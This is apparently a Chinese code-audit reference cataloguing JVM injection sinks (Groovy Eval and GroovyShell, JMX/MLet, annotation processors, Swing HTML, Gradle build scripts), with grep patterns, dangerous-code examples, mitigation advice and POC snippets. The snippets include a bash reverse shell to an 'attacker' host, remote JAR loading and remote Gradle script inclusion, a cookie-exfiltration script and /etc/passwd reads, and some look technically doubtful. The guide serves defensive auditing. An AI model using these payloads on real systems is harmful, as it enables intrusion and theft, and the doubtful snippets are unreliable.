# JVM特性注入

## 目录

| 子模式 | Sink点API | 严重度 |
|--------|----------|--------|
| AP3501.001 Groovy Eval.me | `Eval.me()`, `Eval.xyz()`, `Eval.x()` | 高 |
| AP3501.002 GroovyShell | `GroovyShell.evaluate()`, `GroovyShell.parse()`, `GroovyClassLoader.parseClass()` | 高 |
| AP3501.003 JMX RMI注册漏洞 | `MBeanServer.registerMBean()`, `JMXConnectorServerFactory.newJMXConnectorServer()` | 高 |
| AP3501.004 javac注解处理器注入 | `Processor.process()`, `Filer.createClassFile()` | 中 |
| AP3501.005 Swing HTML渲染注入 | `JEditorPane.setContentType()`, `JEditorPane.setText()` | 中 |
| AP3501.006 Gradle/构建过程注入 | `apply from`, `doLast`, `doFirst`, `project.ext` | 高 |

---

## AP3501.001 Groovy Eval.me

### Sink点

**Sink点Grep模式**:
```
groovy.lang.Eval
Eval.me
Eval.xyz
Eval.x
Eval.y
org.codehaus.groovy.runtime.InvokerHelper
```

**LSP回溯示例**:
```java
// Sink点: Eval.me执行用户表达式
String result = Eval.me(userInput);  // ← Sink点
Eval.me("1+1");

// Sink点: Eval.xyz执行用户表达式
Eval.x(0, userInput);  // ← Sink点
Eval.xy(0, 1, userInput);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `Eval.me`, `Eval.xyz`, `Eval.x`, `Eval.y`

**危险模式**:
```java
Eval.me(userInput);  // RCE
Eval.x(0, userInput);  // x=0, 求值userInput
Eval.xy(0, 1, userInput);  // x=0,y=1, 求值userInput
```

### POC关键片段

```java
Eval.me("java.lang.Runtime.getRuntime().exec('id')")
Eval.me("new File('/etc/passwd').text")
Eval.x(0, "Runtime.getRuntime().exec('id')");
Eval.me("''.class.classLoader.loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')")
```

### 防护建议
- 用户输入不直接作为`Eval.me()`的参数
- 使用白名单验证输入内容
- 使用GroovyShell的Binding限制可访问变量

---

## AP3501.002 GroovyShell.parse/evaluate

### Sink点

**Sink点Grep模式**:
```
GroovyShell
GroovyShell.evaluate
GroovyShell.parse
GroovyClassLoader.parseClass
groovy.lang.GroovyShell
groovy.text.GStringTemplateEngine
```

**LSP回溯示例**:
```java
// Sink点
GroovyShell shell = new GroovyShell();
Object result = shell.evaluate(userScript);  // ← Sink点

// Sink点
Script script = shell.parse(userScript);  // ← Sink点
script.run();

// Sink点
GroovyClassLoader loader = new GroovyClassLoader();
Class clazz = loader.parseClass(userScript);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `GroovyShell`, `evaluate`, `parse`, `GroovyClassLoader`

**危险模式**:
```java
GroovyShell shell = new GroovyShell();
shell.evaluate(userInput);  // RCE
Script script = shell.parse(userInput);
script.run();
GroovyClassLoader loader = new GroovyClassLoader();
Class clazz = loader.parseClass(userInput);
```

### POC关键片段

```java
new GroovyShell().evaluate("Runtime.getRuntime().exec('id')")
new GroovyShell().evaluate("new File('/etc/passwd').text")
new GroovyShell().evaluate("\"${Runtime.getRuntime().exec('bash -i >& /dev/tcp/attacker/6666 0>&1')}\".execute()")
Process.metaClass.invokeMethod('exec','id')
```

### 防护建议
- 用户输入不直接作为GroovyShell脚本
- 使用GroovyShell的Binding限制可访问的类和方法
- 禁用ExpandoMetaClass
- 使用Groovy安全沙箱(SecureASTCustomizer)

---

## AP3501.003 JMX RMI注册漏洞

### Sink点

**Sink点Grep模式**:
```
MBeanServer.registerMBean
JMXConnectorServerFactory.newJMXConnectorServer
JMXConnector.connect
JMXServiceURL
MLet.addURL
mlet
javax.management
```

**LSP回溯示例**:
```java
// Sink点: JMX RMI端口用户可控
MBeanServer mbs = ManagementFactory.getPlatformMBeanServer();
JMXServiceURL url = new JMXServiceURL("rmi", "localhost", userPort, "/jndi/rmi://" + userHost + "/jmxrmi");  // ← 用户可控
JMXConnectorServer cs = JMXConnectorServerFactory.newJMXConnectorServer(url, env, mbs);  // ← Sink点

// Sink点: MLet加载用户MBean
MLet mlet = new MLet();
mlet.addURL(userURL);  // ← 用户可控URL
mlet.loadMBeanFromURL();  // ← Sink点

// Sink点: JMXConnector连接用户指定服务
JMXConnector c = JMXConnectorFactory.connect(new JMXServiceURL(userURL));  // ← Sink点
```

### 漏洞发现

**grep关键词**: `MBeanServer`, `JMXConnectorServer`, `JMXServiceURL`, `MLet`

**危险模式**:
```java
JMXServiceURL url = new JMXServiceURL("rmi", "localhost", userPort, "/jndi/rmi://" + userHost + "/jmxrmi");
JMXConnectorServer cs = JMXConnectorServerFactory.newJMXConnectorServer(url, env, mbs);
MLet mlet = new MLet();
mlet.addURL(userURL);
mlet.loadMBeanFromURL();
JMXConnector c = JMXConnectorFactory.connect(new JMXServiceURL(userURL));
```

### POC关键片段

```java
// JMX RMI 恶意MBean注册
MBeanServer mbs = MBeanServerFactory.createMBeanServer();
ObjectName name = new ObjectName(":type=shell,id=1");
mbs.createMBean("javax.management.remote.snmp.clone", name);

// JMX RMI 连接恶意服务
JMXServiceURL url = new JMXServiceURL("rmi://attacker:1099/jmxrmi");
JMXConnector c = JMXConnectorFactory.connect(url);

// JMX mlet利用
MLet mlet = new MLet();
mlet.addURL("http://attacker/malicious.jar");
ObjectInstance oi = mlet.loadMBean(ObjectName.getInstance("type=shell"));
```

### 防护建议
- JMX RMI端口不要暴露给不可信网络
- 使用SSL/TLS加密JMX连接
- 配置JMX的认证和授权
- 禁用mlet协议的远程类加载

---

## AP3501.004 javac注解处理器注入

### Sink点

**Sink点Grep模式**:
```
javax.annotation.processing.Processor
Processor.process
Filer.createClassFile
Messager.printMessage
ProcessingEnvironment.getFiler
roundEnv.getRootElements
```

**LSP回溯示例**:
```java
// Sink点: 注解处理器写入用户控制的文件
Filer f = env.getFiler();
f.createClassFile(userFileName);  // ← 用户可控文件名 Sink点

// Sink点: 注解处理器生成代码含用户输入
Messager msg = env.getMessager();
msg.printMessage(Kind.WARNING, userInput);  // ← 用户输入进入警告消息 Sink点

// Sink点: 注解处理器使用用户输入的类名
roundEnv.getRootElements().forEach(e -> {
    String className = e.getSimpleName().toString();  // ← 用户可控
    // 使用className生成代码
});
```

### 漏洞发现

**grep关键词**: `Processor`, `Filer`, `Messager`, `createClassFile`

**危险模式**:
```java
Filer f = env.getFiler();
f.createClassFile(userFileName);
Messager msg = env.getMessager();
msg.printMessage(Kind.WARNING, userInput);
```

### POC关键片段

```java
// 注解处理器生成恶意类
@Deprecated
class MaliciousClass {
    static { Runtime.getRuntime().exec("id"); }
}

// 注解处理器注入到现有类
public class UserProcessor implements Processor {
    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        Filer f = env.getFiler();
        // 创建恶意类文件
        return true;
    }
}
```

### 防护建议
- 注解处理器的输入使用白名单验证
- 生成的代码不包含用户直接输入的内容
- 使用安全的类名验证
- 考虑禁用自定义注解处理器

---

## AP3501.005 Swing HTML渲染注入

### Sink点

**Sink点Grep模式**:
```
JEditorPane.setContentType
JEditorPane.setText
JTextPane
HTMLEditorKit
setPage
HTMLDocument
javax.swing
```

**LSP回溯示例**:
```java
// Sink点: JEditorPane渲染用户HTML
JEditorPane editor = new JEditorPane();
editor.setContentType("text/html");  // ← Sink点
editor.setText(userHTML);  // ← 用户可控HTML Sink点

// Sink点: JEditorPane设置页面
editor.setPage(userURL);  // ← 用户可控URL Sink点

// Sink点: HTMLDocument加载用户内容
HTMLDocument doc = new HTMLDocument();
doc.putProperty("stream", userStream);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `JEditorPane`, `setContentType`, `setText`, `HTMLEditorKit`

**危险模式**:
```java
JEditorPane editor = new JEditorPane();
editor.setContentType("text/html");
editor.setText(userHTML);  // 用户可控HTML
editor.setPage(userURL);  // 用户可控URL
```

### POC关键片段

```html
<!-- Swing HTML注入 -->
<html>
<script>document.location='http://attacker/steal?c='+document.cookie</script>
<img src=x onerror='eval(atob("base64encoded"))'>
</html>

<!-- Swing HTML读取本地文件 -->
<html><object data="file:///etc/passwd"></object></html>

<!-- Swing HTML利用CSS -->
<style>@font-face { src: url('http://attacker/font'); }</style>
```

### 防护建议
- 不将用户输入直接设置为JEditorPane的HTML内容
- 使用白名单验证HTML内容
- 禁用JavaScript执行
- 配置安全的内容源策略

---

## AP3501.006 Gradle/构建过程注入

### Sink点

**Sink点Grep模式**:
```
apply from
apply plugin
doLast
doFirst
tasks.named
project.ext
gradle.buildscript
org.gradle
```

**LSP回溯示例**:
```groovy
// Sink点: apply from执行远程脚本
apply from: 'http://attacker/malicious.gradle'  // ← 用户可控URL Sink点

// Sink点: doLast/doFirst执行用户代码
task myTask {
    doLast {
        exec(userInput)  // ← 用户可控命令 Sink点
    }
}

// Sink点: gradle项目配置用户可控
project.ext.userInput = userValue  // ← 用户可控配置 Sink点
```

### 漏洞发现

**grep关键词**: `build.gradle`, `apply from`, `doLast`, `apply plugin`

**危险模式**:
```gradle
apply from: 'http://attacker/malicious.gradle'
task myTask {
    doLast {
        exec(userInput)
    }
}
project.ext.userInput = userValue
```

### POC关键片段

```gradle
// Gradle 远程代码执行
apply from: 'http://attacker/evil.gradle'

// Gradle doLast执行命令
task execTask(type: Exec) {
    doLast {
        executable 'bash'
        args '-c', 'id'
    }
}

// Gradle 动态代码执行
task custom {
    doLast {
        evaluate(new File(userFile))
    }
}

// Gradle 读取环境变量
println "Username: ${System.getenv('USER')}"
```

### 防护建议
- 不执行来源不明的Gradle脚本
- 使用`--offline`模式避免远程脚本执行
- 验证`apply from`的URL来源
- 不在构建脚本中使用用户输入的变量
- 使用Gradle的安全配置禁用危险操作